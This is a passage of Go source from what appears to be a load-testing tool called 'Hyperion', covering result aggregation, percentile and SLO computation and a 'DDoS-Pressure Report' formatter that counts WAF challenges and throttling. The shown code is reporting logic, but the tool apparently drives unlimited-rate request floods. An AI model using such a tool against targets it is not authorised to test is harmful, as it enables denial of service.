		totalCount+=s.count; overflow+=s.overflow; sumMs+=s.sumMs; sumSqMs+=s.sumSqMs
		apdexSat+=s.apdexSat; apdexTol+=s.apdexTol
		for i:=0; i<4; i++ { stageCounts[i]+=s.stageCounts[i]; stageSumMs[i]+=s.stageSumMs[i]; stage5xxErr[i]+=s.stage5xxErr[i] }
		for b:=0; b<histBuckets; b++ { mergedHist[b]+=s.hist[b] }
	}

	hq := func(q float64) float64 {
		if totalCount==0 { return 0 }
		rank:=uint64(math.Ceil((q/100.0)*float64(totalCount))); if rank==0 { rank=1 }
		var cum uint64
		for b:=0; b<histBuckets; b++ { cum+=mergedHist[b]; if cum>=rank { return (float64(b)+0.5)*(float64(histStepMicro)/1000.0) } }
		return maxMs
	}
	p50,p75,p90,p95,p99,p999,p9999 := hq(50),hq(75),hq(90),hq(95),hq(99),hq(99.9),hq(99.99)
	avgMs,jitterMs,apdex := 0.0,0.0,0.0
	if totalCount>0 {
		avgMs=sumMs/float64(totalCount)
		if v:=(sumSqMs/float64(totalCount))-(avgMs*avgMs); v>0 { jitterMs=math.Sqrt(v) }
		apdex=(float64(apdexSat)+0.5*float64(apdexTol))/float64(totalCount)
	}

	rps := float64(totalCount)/math.Max(elapsed.Seconds(),0.001)
	s2xx,s3xx,s4xx,s429,s5xx,errs := live.status2xx.Load(),live.status3xx.Load(),live.status4xx.Load(),live.status429.Load(),live.status5xx.Load(),live.errors.Load()
	errPct:=0.0; if totalCount>0 { errPct=(float64(s5xx+errs)*100.0)/float64(totalCount) }
	slowdown:=1.0; if preLatencyMs>0&&postLatencyMs>0 { slowdown=postLatencyMs/preLatencyMs }

	stageDur:=math.Max(elapsed.Seconds()/4.0,0.001)
	var stages []stageSummary
	stageLabels:=[4]string{"Q1 (0-25%)","Q2 (25-50%)","Q3 (50-75%)","Q4 (75-100%)"}
	kneeRPS,q1Avg:=0.0,0.0
	for i:=0; i<4; i++ {
		c:=stageCounts[i]; sAvg,sErr:=0.0,0.0
		if c>0 { sAvg=stageSumMs[i]/float64(c); sErr=(float64(stage5xxErr[i])*100.0)/float64(c) }
		sRPS:=float64(c)/stageDur
		if i==0 { q1Avg=sAvg } else if kneeRPS==0&&((q1Avg>0&&sAvg>q1Avg*2.5)||sErr>=5.0) { kneeRPS=sRPS }
		stages=append(stages,stageSummary{Stage:i+1,Label:stageLabels[i],Requests:c,RPS:sRPS,AvgMs:sAvg,ErrRatePct:sErr})
	}

	sloFailed:=false; var sloNotes []string
	checkSLO:=func(label string, actual,threshold float64,gt bool){
		if threshold<=0 { return }
		if (gt&&actual>threshold)||(!gt&&actual<threshold) {
			sloFailed=true; sloNotes=append(sloNotes,fmt.Sprintf("FAIL: %s %.2f",label,actual))
		} else { sloNotes=append(sloNotes,fmt.Sprintf("PASS: %s %.2f",label,actual)) }
	}
	checkSLO("p95ms",p95,cfg.sloP95Ms,true); checkSLO("p99ms",p99,cfg.sloP99Ms,true)
	checkSLO("err%",errPct,cfg.sloErrPct,true); checkSLO("apdex",apdex,cfg.sloApdex,false)
	checkSLO("rps",rps,cfg.sloMinRPS,false)

	sigInput:=fmt.Sprintf("hyperion|%s|%d|%.2f|%.2f|%t",cfg.target,totalCount,rps,p95,sloFailed)
	mac:=hmac.New(sha256.New,[]byte(guardCode)); mac.Write([]byte(sigInput))
	receiptSig:=hex.EncodeToString(mac.Sum(nil))[:24]

	if cfg.jsonFile!="" {
		out:=map[string]any{
			"engine":"hyperion-go-sharded-hdr","version":"2.1.0",
			"guard_verified":true,"receipt_hmac":receiptSig,
			"target":cfg.target,"endpoints":specs,"profile":cfg.profile,"pattern":cfg.pattern,
			"duration_seconds":elapsed.Seconds(),"workers":cfg.workers,
			"total_requests":totalCount,"average_rps":rps,"saturation_knee":kneeRPS,
			"apdex_score":apdex,"status_2xx":s2xx,"status_3xx":s3xx,"status_4xx":s4xx,
			"status_429":s429,"status_5xx":s5xx,"transport_errors":errs,"error_rate_pct":errPct,
			"circuit_tripped":live.tripped.Load(),"slo_failed":sloFailed,
			"preflight_ms":preLatencyMs,"postflight_ms":postLatencyMs,"recovery_slowdown":slowdown,
			"waf_challenges":live.wafChallenges.Load(),"serverless_throttles":live.serverlessThrottles.Load(),
			"cache_hits":live.cacheHits.Load(),"cache_misses":live.cacheMisses.Load(),
			"stages":stages,
			"latency_ms":map[string]float64{"min":minMs,"avg":avgMs,"stdev":jitterMs,
				"p50":p50,"p75":p75,"p90":p90,"p95":p95,"p99":p99,"p999":p999,"p9999":p9999,"max":maxMs},
		}
		if raw,err:=json.MarshalIndent(out,"","  "); err==nil { _=os.WriteFile(cfg.jsonFile,raw,0o644) }
	}

	var b strings.Builder
	b.WriteString("\n## ⚡ Hyperion v2.1 DDoS-Pressure Report\n\n")
	fmt.Fprintf(&b,"- Target: `%s` (%d endpoint(s))\n",cfg.target,len(specs))
	fmt.Fprintf(&b,"- Profile: `%s` | Pattern: `%s` | Method: `%s` | Workers: `%d` | H2-Aggressive: `%v`\n",
		cfg.profile,cfg.pattern,cfg.method,cfg.workers,cfg.h2Aggressive)
	fmt.Fprintf(&b,"- Total: `%d` | RPS: `%.1f` | Duration: `%s`\n",totalCount,rps,elapsed.Round(time.Millisecond))
	fmt.Fprintf(&b,"- Apdex (T=%.0fms): `%.3f` | Knee: `%s`\n",cfg.apdexTMs,apdex,
		func()string{if kneeRPS>0{return fmt.Sprintf("%.1f RPS",kneeRPS)};return "none"}())
	fmt.Fprintf(&b,"- HTTP 2xx/3xx/4xx/429/5xx/err: `%d/%d/%d/%d/%d/%d` err=`%.2f%%`\n",
		s2xx,s3xx,s4xx,s429,s5xx,errs,errPct)
	fmt.Fprintf(&b,"- Latency min/avg/jitter(σ)/max: `%.2fms/%.2fms/%.2fms/%.2fms`\n",minMs,avgMs,jitterMs,maxMs)
	fmt.Fprintf(&b,"- HDR p50/p75/p90/p95/p99/p99.9/p99.99: `%.2fms/%.2fms/%.2fms/%.2fms/%.2fms/%.2fms/%.2fms`\n",
		p50,p75,p90,p95,p99,p999,p9999)
	fmt.Fprintf(&b,"- Edge: cache_hits=%d cache_misses=%d WAF_challenges=%d serverless_throttles=%d\n",
		live.cacheHits.Load(),live.cacheMisses.Load(),live.wafChallenges.Load(),live.serverlessThrottles.Load())
	fmt.Fprintf(&b,"- Pre→Post: `%.2fms(HTTP %d) → %.2fms(HTTP %d) [%.2fx slowdown]`\n",
		preLatencyMs,preStatus,postLatencyMs,postStatus,slowdown)
	fmt.Fprintf(&b,"- Guard HMAC: `%s`\n",receiptSig)
	if len(sloNotes)>0 { fmt.Fprintf(&b,"- SLO: `%s`\n",strings.Join(sloNotes," | ")) }
	return b.String(), sloFailed
}

func parseHeaders(values []string) (map[string]string, error) {
	out := map[string]string{}
	for _, raw := range values {
		parts := strings.SplitN(raw,":",2)
		if len(parts)!=2 { return nil, fmt.Errorf("header must be 'Name: value': %q",raw) }
		k,v:=strings.TrimSpace(parts[0]),strings.TrimSpace(parts[1])
		if k=="" { return nil, fmt.Errorf("header name empty") }
		out[k]=v
	}
	return out, nil
}

func loadPayload(path string) ([]byte, error) {
	if path=="" { return nil,nil }
	return os.ReadFile(path)
}

func parseRate(raw string) (float64, error) {
	s:=strings.ToLower(strings.TrimSpace(raw))
	if s=="" { return 0,fmt.Errorf("rate empty") }
	if s=="0"||s=="full"||s=="full-send"||s=="max" { return 0,nil }
	perMin:=false
	for _,suf:=range []string{"/min","rpm","permin","per-minute"} {
		if strings.HasSuffix(s,suf) { perMin=true; s=strings.TrimSuffix(s,suf); break }
	}
	for _,suf:=range []string{"/s","rps","persec","per-second"} {
		if strings.HasSuffix(s,suf) { s=strings.TrimSuffix(s,suf); break }
	}
	mult:=1.0
	switch {
	case strings.HasSuffix(s,"k"): mult=1e3; s=strings.TrimSuffix(s,"k")
	case strings.HasSuffix(s,"m"): mult=1e6; s=strings.TrimSuffix(s,"m")
	case strings.HasSuffix(s,"g"): mult=1e9; s=strings.TrimSuffix(s,"g")
	}
	v,err:=strconv.ParseFloat(strings.TrimSpace(s),64)
	if err!=nil||v<0 { return 0,fmt.Errorf("invalid rate %q",raw) }
	v*=mult; if perMin { v/=60 }
	return v,nil
}

func exitError(err error) {
	fmt.Fprintf(os.Stderr,"hyperion: %v\n",err)
	os.Exit(2)
}
